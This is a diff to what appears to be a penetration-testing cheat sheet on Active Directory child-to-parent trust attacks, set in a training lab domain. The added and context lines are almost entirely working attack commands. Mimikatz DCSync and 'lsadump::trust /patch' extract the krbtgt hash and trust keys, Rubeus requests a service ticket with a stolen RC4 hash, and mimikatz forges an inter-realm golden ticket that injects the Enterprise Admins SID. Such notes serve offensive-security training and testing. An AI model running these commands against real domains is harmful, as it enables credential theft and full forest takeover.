@@ -88,7 +88,7 @@ bloodhound
 
 ### Windows
 
-1) **Obtaining the KRBTGT**
+1) **Obtaining the KRBTGT hash**
 ```powershell
 mimikatz.exe "lsadump::dcsync /user:LOGISTICS\krbtgt"
 ```
@@ -117,7 +117,23 @@ klist
 6) Performing a DCSync Attack against parent domain then we can forge golden ticket
 ```
 .\mimikatz.exe "lsadump::dcsync" "/domain:INLANEFREIGHT.LOCAL" "/user:INLANEFREIGHT\lab_adm"
+
+# or ask a ticket for a service
+.\Rubeus.exe asktgs /rc4:9d765b482771505cbe97411065964d5f /service:CIFS/DC.INLANEFREIGHT.LOCAL /dc:DC.INLANEFREIGHT.LOCAL /ptt
+
 ```
+
+#### another way 
+
+```
+mimikatz.exe "lsadump::trust  /patch"
+
+mimikatz.exe "kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ticket:trustkey.kirbi /ptt"
+
+klist
+
+```
+
 
 ### Linux
 1) **Obtaining the KRBTGT**
